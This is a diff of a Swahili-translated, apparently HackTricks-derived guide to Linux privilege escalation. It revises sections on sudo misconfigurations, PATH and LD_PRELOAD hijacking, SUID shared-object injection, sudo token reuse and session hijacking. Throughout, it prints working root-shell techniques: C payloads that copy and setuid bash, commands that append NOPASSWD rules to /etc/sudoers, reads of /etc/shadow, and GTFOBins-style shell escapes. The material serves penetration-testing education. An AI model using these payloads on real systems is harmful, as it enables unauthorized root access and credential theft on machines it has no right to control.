@@ -735,33 +730,33 @@ sudo tar c a.tar -I ./runme.sh a
 ftp>!/bin/sh
 less>! <shell_comand>
 ```
-### BILA NENO LA SIRI
+### NOPASSWD
 
-Usanidi wa Sudo unaweza kuruhusu mtumiaji kutekeleza amri fulani kwa mamlaka ya mtumiaji mwingine bila kujua neno la siri.
+Mkonfigu wa Sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia haki za mtumiaji mwingine bila kujua nenosiri.
 ```
 $ sudo -l
 User demo may run the following commands on crashlab:
 (root) NOPASSWD: /usr/bin/vim
 ```
-Katika mfano huu mtumiaji `demo` anaweza kukimbia `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ufunguo wa ssh kwenye saraka ya root au kwa kuita `sh`.
+Katika mfano huu, mtumiaji `demo` anaweza kukimbia `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ufunguo wa ssh kwenye saraka ya root au kwa kuita `sh`.
 ```
 sudo vim -c '!sh'
 ```
 ### SETENV
 
-Mwongozo huu inaruhusu mtumiaji **kuweka mazingira ya mazingira** wakati wa kutekeleza kitu:
+Hii amri inamruhusu mtumiaji **kuweka mabadiliko ya mazingira** wakati wa kutekeleza kitu:
 ```bash
 $ sudo -l
 User waldo may run the following commands on admirer:
 (ALL) SETENV: /opt/scripts/admin_tasks.sh
 ```
-Mfano huu, **ukitegemea kifaa cha HTB Admirer**, ulikuwa **mnyonge** kwa **PYTHONPATH hijacking** ili kupakia maktaba ya python ya kupendelea wakati wa kutekeleza script kama root:
+Hii mfano, **imejengwa kwenye mashine ya HTB Admirer**, ilikuwa **na udhaifu** wa **PYTHONPATH hijacking** ili kupakia maktaba ya python isiyo na mipaka wakati wa kutekeleza skripti kama root:
 ```bash
 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
-### Kupita kwa utekelezaji wa Sudo bila kufuata njia
+### Sudo execution bypassing paths
 
-**Ruka** ili usome faili zingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
+**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
 ```bash
 sudo less /var/logs/anything
 less>:e /etc/shadow #Jump to read other files using privileged less
@@ -776,39 +771,41 @@ Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:
 sudo less /var/log/../../etc/shadow #Read shadow
 sudo less /var/log/something /etc/shadow #Red 2 files
 ```
-**Hatua za Kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
+**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
 
-### Amri ya Sudo/Binary ya SUID bila njia ya amri
+### Amri ya Sudo/SUID bila njia ya amri
 
-Ikiwa **ruhusa ya sudo** imetolewa kwa amri moja **bila kutoa njia**: _hacker10 ALL= (root) less_ unaweza kutumia udhaifu huo kwa kubadilisha PATH variable
+Ikiwa **idhini ya sudo** imetolewa kwa amri moja **bila kubainisha njia**: _hacker10 ALL= (root) less_ unaweza kuitumia kwa kubadilisha mabadiliko ya PATH
 ```bash
 export PATH=/tmp:$PATH
 #Put your backdoor in /tmp and name it "less"
 sudo less
 ```
-Tekniki hii inaweza kutumika pia ikiwa binary ya **suid** **inaendesha amri nyingine bila kutaja njia yake (hakikisha daima unachunguza na** _**strings**_ **maudhui ya binary ya SUID isiyoeleweka)**.
+Hii mbinu inaweza pia kutumika ikiwa **suid** binary **inaendesha amri nyingine bila kubainisha njia yake (daima angalia na** _**strings**_ **maudhui ya SUID binary isiyo ya kawaida)**.
 
-[Mifano ya mzigo wa kutekeleza.](payloads-to-execute.md)
+[Payload examples to execute.](payloads-to-execute.md)
 
-### Binary ya SUID na njia ya amri
+### SUID binary yenye njia ya amri
 
-Ikiwa binary ya **suid** **inaendesha amri nyingine ikieleza njia**, basi, unaweza kujaribu **kutumia kazi** iliyoitwa kama amri ambayo faili ya suid inaita.
+Ikiwa **suid** binary **inaendesha amri nyingine ikibainisha njia**, basi, unaweza kujaribu **kutoa kazi** iliyo na jina kama amri ambayo faili la suid linaita.
 
-Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda kazi na kuiegesha:
+Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda kazi hiyo na kuisafirisha:
 ```bash
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
 ```
+Then, when you call the suid binary, this function will be executed
+
 ### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
 
-Mazingira ya **LD\_PRELOAD** hutumika kutaja maktaba moja au zaidi zinazoshirikishwa (.so files) zitakazopakiwa na loader kabla ya zingine zote, ikiwa ni pamoja na maktaba ya C ya kawaida (`libc.so`). Mchakato huu unajulikana kama kushirikisha maktaba kabla.
+The **LD\_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.
 
-Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kuchukuliwa faida, hasa na utekelezaji wa **suid/sgid** executables, mfumo unatekeleza masharti fulani:
+However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:
 
-- Loader hauzingatii **LD\_PRELOAD** kwa executables ambapo kitambulisho halisi cha mtumiaji (_ruid_) hakilingani na kitambulisho cha mtumiaji kilichopo (_euid_).
-- Kwa executables zenye suid/sgid, maktaba zinazopakiwa ni zile zilizo kwenye njia za kawaida ambazo pia ni suid/sgid.
+* The loader disregards **LD\_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
+* For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.
 
-Kupandisha mamlaka kunaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha kauli **env\_keep+=LD\_PRELOAD**. Mipangilio hii inaruhusu mazingira ya **LD\_PRELOAD** kudumu na kutambuliwa hata wakati amri zinatekelezwa kwa kutumia `sudo`, ikiongoza kwa utekelezaji wa nambari ya aina yoyote na mamlaka yaliyopandishwa.
+Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env\_keep+=LD\_PRELOAD**. This configuration allows the **LD\_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
 ```
 Defaults        env_keep += LD_PRELOAD
 ```
@@ -825,17 +822,17 @@ setuid(0);
 system("/bin/bash");
 }
 ```
-Kisha **sakinisha** kutumia:
+Kisha **jenga** kwa kutumia:
 ```bash
 cd /tmp
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-Hatimaye, **ongeza mamlaka** kukimbia
+Hatimaye, **escalate privileges** running
 ```bash
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 {% hint style="danger" %}
-Kama mshambuliaji anadhibiti **LD\_LIBRARY\_PATH** env variable kwa sababu anadhibiti njia ambapo maktaba zitatafutwa, privesc sawa inaweza kutumiwa vibaya.
+Privesc kama hii inaweza kutumika vibaya ikiwa mshambuliaji anadhibiti **LD\_LIBRARY\_PATH** env variable kwa sababu anadhibiti njia ambapo maktaba zitatafutwa.
 {% endhint %}
 ```c
 #include <stdio.h>
@@ -856,15 +853,15 @@ cd /tmp
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
-### Binary ya SUID - Uingizaji wa .so
+### SUID Binary – .so injection
 
-Uponapo kutana na binary yenye ruhusa za **SUID** ambayo inaonekana isiyo ya kawaida, ni mazoea mazuri kuhakikisha kama inapakia faili za **.so** ipasavyo. Hii inaweza kuthibitishwa kwa kukimbia amri ifuatayo:
+Wakati wa kukutana na binary yenye ruhusa za **SUID** ambazo zinaonekana zisizo za kawaida, ni mazoea mazuri kuthibitisha ikiwa inapakua faili za **.so** ipasavyo. Hii inaweza kuangaliwa kwa kuendesha amri ifuatayo:
 ```bash
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
-Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (Hakuna faili au saraka kama hiyo)"_ inaashiria uwezekano wa kutumia.
+Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (Hakuna faili au directory kama hiyo)"_ kunapendekeza uwezekano wa unyakuzi.
 
-Kutumia hili, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, yenye msimbo ufuatao:
+Ili kutumia hili, mtu angeendelea kwa kuunda faili la C, sema _"/path/to/.config/libcalc.c"_, lenye msimbo ufuatao:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -875,13 +872,15 @@ void inject(){
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-Msimbo huu, mara baada ya kuchakatwa na kutekelezwa, lengo lake ni kukuza mamlaka kwa kubadilisha ruhusa za faili na kutekeleza kifaa na mamlaka yaliyopandishwa.
+Hii code, mara tu inapoandikwa na kutekelezwa, inalenga kuinua mamlaka kwa kubadilisha ruhusa za faili na kutekeleza shell yenye mamlaka yaliyoimarishwa.
 
-Chakata faili ya C hapo juu kuwa faili ya kitu kilichoshirikishwa (.so) kwa:
+Andika faili ya C hapo juu kuwa faili ya kitu kilichoshirikiwa (.so) kwa:
 ```bash
 gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 ```
-## Kutekeleza Utekelezaji wa Kitu Kimeunganishwa Kwa Pamoja
+Hatimaye, kuendesha SUID binary iliyoathiriwa inapaswa kuanzisha exploit, ikiruhusu uwezekano wa kuathiri mfumo.
+
+## Shared Object Hijacking
 ```bash
 # Lets find a SUID using a non-standard library
 ldd some_suid
@@ -891,7 +890,7 @@ something.so => /lib/x86_64-linux-gnu/something.so
 readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
 ```
-Sasa tumeona binary ya SUID ikiload maktaba kutoka kwenye folda ambapo tunaweza kuandika, tujenge maktaba hiyo kwenye folda hiyo na jina linalohitajika:
+Sasa kwamba tumepata binary ya SUID inayopakia maktaba kutoka kwa folda ambapo tunaweza kuandika, hebu tuunde maktaba katika folda hiyo kwa jina linalohitajika:
 ```c
 //gcc src.c -fPIC -shared -o /development/libshared.so
 #include <stdio.h>
@@ -904,17 +903,17 @@ setresuid(0,0,0);
 system("/bin/bash -p");
 }
 ```
-Ikiwa unapata kosa kama hilo
+Ikiwa unapata kosa kama
 ```shell-session
 ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
 ```
-Hii inamaanisha kwamba maktaba uliyoitengeneza inahitaji kuwa na kazi inayoitwa `a_function_name`.
+hii inamaanisha kwamba maktaba uliyounda inahitaji kuwa na kazi inayoitwa `a_function_name`.
 
 ### GTFOBins
 
-[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo zinaweza kutumiwa na mshambuliaji kukiuka vizuizi vya usalama wa ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa hali ambapo unaweza **kuingiza tu hoja** katika amri.
+[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo zinaweza kutumiwa na mshambuliaji ili kupita vizuizi vya usalama wa ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **tu kuingiza hoja** katika amri.
 
-Mradi huu unakusanya kazi halali za Unix binaries ambazo zinaweza kutumiwa vibaya kuvunja mabwawa yaliyozuiwa, kukuza au kudumisha mamlaka zilizo juu, kuhamisha faili, kuzalisha bind na reverse shells, na kurahisisha kazi zingine za baada ya uvamizi.
+Mradi huu unakusanya kazi halali za Unix binaries ambazo zinaweza kutumiwa vibaya kuvunja nje ya shells zilizozuiliwa, kupandisha au kudumisha haki za juu, kuhamasisha faili, kuanzisha bind na reverse shells, na kuwezesha kazi nyingine za baada ya unyakuzi.
 
 > gdb -nx -ex '!sh' -ex quit\
 > sudo mysql -e '! /bin/sh'\
@@ -927,60 +926,60 @@ Mradi huu unakusanya kazi halali za Unix binaries ambazo zinaweza kutumiwa vibay
 
 ### FallOfSudo
 
-Ikiwa unaweza kupata `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa inagundua jinsi ya kutumia sheria yoyote ya sudo.
+Ikiwa unaweza kufikia `sudo -l` unaweza kutumia chombo [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa kinapata jinsi ya kutumia sheria yoyote ya sudo.
 
-### Kutumia Upya Vitufe vya Sudo
+### Reusing Sudo Tokens
 
-Katika hali ambapo una **upatikanaji wa sudo** lakini sio nenosiri, unaweza kukuza mamlaka kwa **kungojea utekelezaji wa amri ya sudo na kisha kuteka kikao cha token**.
+Katika kesi ambapo una **sudo access** lakini si nenosiri, unaweza kupandisha haki kwa **kusubiri utekelezaji wa amri ya sudo na kisha kuingilia kati token ya kikao**.
 
-Mahitaji ya kukuza mamlaka:
+Mahitaji ya kupandisha haki:
 
 * Tayari una shell kama mtumiaji "_sampleuser_"
-* "_sampleuser_" ame **tumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa kawaida hiyo ni muda wa token ya sudo inayoturuhusu kutumia `sudo` bila kuingiza nenosiri lolote)
+* "_sampleuser_" amekuwa **ameitisha `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa kawaida hiyo ndiyo muda wa token ya sudo inayoturuhusu kutumia `sudo` bila kuingiza nenosiri lolote)
 * `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
 * `gdb` inapatikana (unaweza kuweza kuipakia)
 
-(Unaweza kuwezesha kwa muda `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kudumisha kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)
+(Unaweza kuwezesha kwa muda `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kubadilisha kwa kudumu `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)
 
-Ikiwa mahitaji yote haya yanakidhiwa, **unaweza kukuza mamlaka kwa kutumia:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)
+Ikiwa mahitaji haya yote yanakidhi, **unaweza kupandisha haki kwa kutumia:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo_inject)
 
-* **Uvamizi wa kwanza** (`exploit.sh`) utaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kutumia hiyo kuiwezesha token ya sudo katika kikao chako (hutapata moja kwa moja kabisa shell ya mizizi, fanya `sudo su`):
+* **unyakuzi wa kwanza** (`exploit.sh`) utaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuamsha token ya sudo katika kikao chako** (hutapata shell ya root moja kwa moja, fanya `sudo su`):
 ```bash
 bash exploit.sh
 /tmp/activate_sudo_token
 sudo su
 ```
-* **Exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **iliyomilikiwa na root na setuid**
+* The **second exploit** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **iliyomilikiwa na root yenye setuid**
 ```bash
 bash exploit_v2.sh
 /tmp/sh -p
 ```
-* **Exploit ya tatu** (`exploit_v3.sh`) ita **unda faili ya sudoers** ambayo inafanya **vitambulisho vya sudo kuwa vya milele na kuruhusu watumiaji wote kutumia sudo**
+* The **third exploit** (`exploit_v3.sh`) itaunda **faili la sudoers** ambalo linafanya **tokens za sudo kuwa za milele na kuruhusu watumiaji wote kutumia sudo**
 ```bash
 bash exploit_v3.sh
 sudo su
 ```
-### /var/run/sudo/ts/\<Jina la Mtumiaji>
+### /var/run/sudo/ts/\<Username>
 
-Ikiwa una **ruhusa za kuandika** kwenye folda au kwenye faili yoyote iliyoundwa ndani ya folda unaweza kutumia binary [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) ku **unda token ya sudo kwa mtumiaji na PID**.\
-Kwa mfano, ikiwa unaweza kubadilisha faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo na PID 1234, unaweza **kupata mamlaka ya sudo** bila kuhitaji kujua nenosiri kwa kufanya:
+Ikiwa una **idhini za kuandika** katika folda au kwenye faili zozote zilizoundwa ndani ya folda hiyo unaweza kutumia binary [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda token ya sudo kwa mtumiaji na PID**.\
+Kwa mfano, ikiwa unaweza kufuta faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo mwenye PID 1234, unaweza **kupata mamlaka ya sudo** bila kuhitaji kujua nenosiri kwa kufanya:
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
 ```
 ### /etc/sudoers, /etc/sudoers.d
 
-Faili `/etc/sudoers` na faili ndani ya `/etc/sudoers.d` huzingatia ni nani anaweza kutumia `sudo` na jinsi gani. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kikundi cha root**.\
-**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata habari za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kupandisha vyeo**.
+Faili `/etc/sudoers` na faili ndani ya `/etc/sudoers.d` zinaweka mipangilio ya nani anaweza kutumia `sudo` na jinsi. Faili hizi **kwa kawaida zinaweza kusomwa tu na mtumiaji root na kundi root**.\
+**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kuinua mamlaka**.
 ```bash
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
 ```
-Ikiwa unaweza kuandika unaweza kutumia ruhusa hii
+Ikiwa unaweza kuandika unaweza kutumia vibaya ruhusa hii
 ```bash
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
 ```
-Njia nyingine ya kutumia vibali hivi:
+Njia nyingine ya kutumia vibaya ruhusa hizi:
 ```bash
 # makes it so every terminal can sudo
 echo "Defaults !tty_tickets" > /etc/sudoers.d/win
@@ -989,17 +988,17 @@ echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
 ```
 ### DOAS
 
-Kuna njia mbadala za faili ya `sudo` kama vile `doas` kwa OpenBSD, kumbuka kuangalia mazingira yake katika `/etc/doas.conf`
+Kuna baadhi ya mbadala wa `sudo` binary kama `doas` kwa OpenBSD, kumbuka kuangalia usanidi wake kwenye `/etc/doas.conf`
 ```
 permit nopass demo as root cmd vim
 ```
-### Udukuzi wa Sudo
+### Sudo Hijacking
 
-Ikiwa unajua kwamba **mtumiaji kawaida hujihusisha na mashine na kutumia `sudo`** kuongeza mamlaka na umepata shell ndani ya muktadha huo wa mtumiaji, unaweza **kuunda faili mpya ya sudo** ambayo itatekeleza nambari yako kama root na kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuongeza njia mpya katika .bash\_profile) ili wakati mtumiaji anatekeleza sudo, faili yako ya sudo itatekelezwa.
+Ikiwa unajua kwamba **mtumiaji kwa kawaida anajiunga na mashine na anatumia `sudo`** kuongeza mamlaka na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** ambayo itatekeleza msimbo wako kama root na kisha amri ya mtumiaji. Kisha, **badilisha $PATH** wa muktadha wa mtumiaji (kwa mfano kuongeza njia mpya katika .bash\_profile) ili wakati mtumiaji anatekeleza sudo, executable yako ya sudo itatekelezwa.
 
-Tafadhali kumbuka kwamba ikiwa mtumiaji anatumia kabati tofauti (si bash) utahitaji kuhariri faili nyingine kuongeza njia mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) inahariri `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)
+Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (sio bash) utahitaji kubadilisha faili nyingine kuongeza njia mpya. Kwa mfano[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
 
-Au kutekeleza kitu kama:
+Au kuendesha kitu kama:
 ```bash
 cat >/tmp/sudo <<EOF
 #!/bin/bash
@@ -1014,16 +1013,16 @@ zsh
 echo $PATH
 sudo ls
 ```
-## Maktaba ya Pamoja
+## Shared Library
 
 ### ld.so
 
-Faili `/etc/ld.so.conf` inaonyesha **mahali ambapo faili za mipangilio iliyopakiwa zinatoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`
+Faili `/etc/ld.so.conf` inaonyesha **mahali ambapo faili za usanidi zilizoloadiwa zinatoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`
 
-Hii inamaanisha kuwa faili za mipangilio kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za mipangilio **zinaweza kuelekeza kwenye folda nyingine** ambapo **maktaba** zitatafutwa. Kwa mfano, yaliyomo kwenye `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.
+Hii inamaanisha kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaelekeza kwenye folda nyingine** ambapo **maktaba** zitatafutwa. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kwamba mfumo utafuta maktaba ndani ya `/usr/local/lib`**.
 
-Ikiwa kwa sababu fulani **mtumiaji ana ruhusa ya kuandika** kwenye mojawapo ya njia zilizotajwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili ya mipangilio ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa kukuza mamlaka.\
-Angalia **jinsi ya kutumia udhaifu huu wa usanidi vibaya** kwenye ukurasa ufuatao:
+Ikiwa kwa sababu fulani **mtumiaji ana ruhusa za kuandika** kwenye yoyote ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa kupandisha hadhi.\
+Angalia **jinsi ya kutumia makosa haya ya usanidi** kwenye ukurasa ufuatao:
 
 {% content-ref url="ld.so.conf-example.md" %}
 [ld.so.conf-example.md](ld.so.conf-example.md)
@@ -1040,7 +1039,7 @@ linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
 ```
-Kwa kuchapisha lib ndani ya `/var/tmp/flag15/` itatumika na programu mahali hapa kama ilivyoelezwa katika variable ya `RPATH`.
+Kwa kunakili lib ndani ya `/var/tmp/flag15/` itatumika na programu katika mahali hapa kama ilivyoainishwa katika mabadiliko ya `RPATH`.
 ```
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
 
@@ -1049,7 +1048,7 @@ linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
 ```
-Kisha tengeneza maktaba mbaya katika `/var/tmp` kwa `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
+Kisha tengeneza maktaba mbaya katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
 ```c
 #include<stdlib.h>
 #define SHELL "/bin/sh"
@@ -1064,58 +1063,58 @@ execve(file,argv,0);
 ```
 ## Uwezo
 
-Uwezo wa Linux hutoa **sehemu ya mizizi inayopatikana kwa mchakato**. Hii kimsingi huvunja **mizizi ya uwezo kuwa sehemu ndogo na za kipekee**. Kila moja ya sehemu hizi inaweza kutolewa kwa mchakato kivyake. Kwa njia hii seti kamili ya uwezo inapunguzwa, ikipunguza hatari za unyonyaji.\
-Soma ukurasa ufuatao kujifunza zaidi kuhusu uwezo na jinsi ya **kutumia vibaya**:
+Uwezo wa Linux unatoa **sehemu ya ruhusa za mizizi zinazopatikana kwa mchakato**. Hii kwa ufanisi inavunja ruhusa za mizizi **kuwa vitengo vidogo na tofauti**. Kila moja ya vitengo hivi inaweza kisha kutolewa kwa mchakato kwa uhuru. Kwa njia hii, seti kamili ya ruhusa inapunguzwa, ikipunguza hatari za unyakuzi.\
+Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu uwezo na jinsi ya kuyatumia vibaya**:
 
 {% content-ref url="linux-capabilities.md" %}
 [linux-capabilities.md](linux-capabilities.md)
 {% endcontent-ref %}
 
-## Vibali vya Direktori
+## Ruhusa za Katalogi
 
-Katika saraka, **biti ya "utekelezaji"** inamaanisha kuwa mtumiaji anayehusika anaweza "**cd**" kuingia kwenye saraka.\
-Biti ya **"soma"** inamaanisha mtumiaji anaweza **kuorodhesha** **faili**, na biti ya **"andika"** inamaanisha mtumiaji anaweza **kufuta** na **kuunda** **faili** mpya.
+Katika katalogi, **bit ya "tekeleza"** inaashiria kwamba mtumiaji aliyeathiriwa anaweza "**cd**" ndani ya folda.\
+Bit ya **"soma"** inaashiria kwamba mtumiaji anaweza **orodhesha** **faili**, na bit ya **"andika"** inaashiria kwamba mtumiaji anaweza **futa** na **unda** **faili** mpya.
 
 ## ACLs
 
-Orodha za Kudhibiti Upatikanaji (ACLs) zinaonyesha safu ya pili ya vibali vya hiari, vinavyoweza **kupuuza vibali vya jadi vya ugo/rwx**. Vibali hivi huongeza udhibiti juu ya ufikiaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kikundi. Kiwango hiki cha **ufafanuzi hutoa usimamizi sahihi zaidi wa ufikiaji**. Maelezo zaidi yanaweza kupatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).
+Orodha za Udhibiti wa Ufikiaji (ACLs) zinawakilisha tabaka la pili la ruhusa za hiari, zenye uwezo wa **kuzidi ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaboresha udhibiti juu ya ufikiaji wa faili au katalogi kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kundi. Kiwango hiki cha **ukamilifu kinahakikisha usimamizi sahihi wa ufikiaji**. Maelezo zaidi yanaweza kupatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).
 
-**Toa** mtumiaji "kali" vibali vya kusoma na kuandika kwenye faili:
+**Patia** mtumiaji "kali" ruhusa za kusoma na kuandika juu ya faili:
 ```bash
 setfacl -m u:kali:rw file.txt
 #Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)
 
 setfacl -b file.txt #Remove the ACL of the file
 ```
-**Pata** faili zenye ACLs maalum kutoka kwenye mfumo:
+**Pata** faili zenye ACL maalum kutoka kwa mfumo:
 ```bash
 getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
-## Fungua vikao vya kabati
+## Open shell sessions
 
-Katika **toleo za zamani** unaweza **kuiba** vikao vya kabati vya mtumiaji mwingine (**root**).\
-Katika **toleo jipya zaidi** utaweza **kuunganisha** kwenye vikao vya skrini tu vya **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **habari za kuvutia ndani ya kikao**.
+Katika **toleo za zamani** unaweza **kuchukua** baadhi ya **sehemu** za mtumiaji tofauti (**root**).\
+Katika **toleo za hivi karibuni** utaweza **kuungana** na sehemu za skrini tu za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **habari za kuvutia ndani ya sehemu**.
 
-### Kuiba vikao vya skrini
+### screen sessions hijacking
 
-**Orodhesha vikao vya skrini**
+**Orodha ya sehemu za skrini**
 ```bash
 screen -ls
 screen -ls <username>/ # Show another user' screen sessions
 ```
 ![](<../../.gitbook/assets/image (141).png>)
 
-**Ambatisha kwenye kikao**
+**Unganisha kwenye kikao**
 ```bash
 screen -dr <session> #The -d is to detach whoever is attached to it
 screen -dr 3350.foo #In the example of the image
 screen -x [user]/[session id]
 ```
-## Kuteka vikao vya tmux
+## tmux sessions hijacking
 
